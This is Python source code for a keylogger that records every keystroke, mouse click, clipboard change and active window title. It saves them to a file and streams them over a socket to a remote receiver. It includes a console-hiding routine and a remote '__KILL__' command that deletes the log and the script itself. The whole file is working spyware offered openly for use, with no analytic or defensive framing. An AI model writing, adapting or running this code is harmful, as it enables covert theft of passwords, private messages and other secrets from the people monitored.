import datetime, threading, time, socket, platform, os, sys
from pynput import keyboard, mouse
import pyperclip, psutil

log_file = "keylog_output.txt"
REMOTE_IP = "192.168.0.17"  # <-- Replace with receiver's IP
REMOTE_PORT = 65432
current_window = None
last_logged_window = None
last_clipboard = ""
sock = None

# === PLATFORM-SPECIFIC IMPORTS ===
if platform.system() == "Windows":
    import win32gui, win32process, ctypes


# === OS-SAFE CONSOLE HIDING ===
def hide_console():
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def setup_connection():
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print(f"[DEBUG] Trying to connect to {REMOTE_IP}:{REMOTE_PORT}")
        sock.connect((REMOTE_IP, REMOTE_PORT))
        print("[DEBUG] Connected to receiver!")
        threading.Thread(target=listen_for_kill_command, daemon=True).start()
    except Exception as e:
        print(f"[Connection Error] {e}")
        sock = None

def log_event(data):
    print(data, end="")
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(data)
        if sock:
            sock.sendall(data.encode('utf-8'))
    except Exception as e:
        print(f"[Log Error] {e}")

def get_active_window():
    global current_window, last_logged_window
    try:
        if platform.system() == "Windows":
            import win32gui, win32process
            hwnd = win32gui.GetForegroundWindow()
            pid = win32process.GetWindowThreadProcessId(hwnd)[1]
            process = psutil.Process(pid)
            app_name = process.name()
            win_title = win32gui.GetWindowText(hwnd)
            if win_title != last_logged_window:
                last_logged_window = win_title
                return f"\n\n[Window: {win_title} | App: {app_name} - {datetime.datetime.now()}]\n"

        elif platform.system() == "Darwin":
            active_app = NSWorkspace.sharedWorkspace().frontmostApplication() # type: ignore
            app_name = active_app.localizedName()
            if app_name != last_logged_window:
                last_logged_window = app_name
                return f"\n\n[App: {app_name} - {datetime.datetime.now()}]\n"

    except Exception as e:
        return f"\n[Window Error] {e}\n"
    return ""

def on_press(key):
    try:
        info = get_active_window()
        if info:
            log_event(info)
        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        text = key.char if hasattr(key, 'char') and key.char else f"[{key}]"
        log_event(f"[{stamp}] {text}\n")
    except Exception as e:
        log_event(f"[Key Error] {e}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print("\n[Keylogger stopped]")
        return False

def on_click(x, y, button, pressed):
    if pressed:
        info = get_active_window()
        if info:
            log_event(info)
        log_event(f"[Mouse Click] {button} at ({x}, {y}) on {datetime.datetime.now()}\n")

def monitor_clipboard():
    global last_clipboard
    while True:
        try:
            clip = pyperclip.paste()
            if clip != last_clipboard:
                last_clipboard = clip
                info = get_active_window()
                if info:
                    log_event(info)
                log_event(f"[Clipboard] {datetime.datetime.now()}: {clip}\n")
        except:
            pass
        time.sleep(5)

def listen_for_kill_command():
    try:
        while True:
            if sock:
                data = sock.recv(1024)
                if data.decode('utf-8').strip() == "__KILL__":
                    log_event("[Self-Destruct Triggered]\n")
                    time.sleep(1)
                    os.remove(log_file)
                    os.remove(os.path.realpath(__file__))
                    sys.exit()
    except Exception as e:
        print(f"[Kill Listener Error] {e}")

def main():
    # Comment out during debugging
    # hide_console()
    setup_connection()
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    kb_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    mouse_listener = mouse.Listener(on_click=on_click)
    kb_listener.start()
    mouse_listener.start()
    kb_listener.join()
    mouse_listener.stop()

if __name__ == "__main__":
    print("[Keylogger running — Press ESC to stop]\n")
    main()
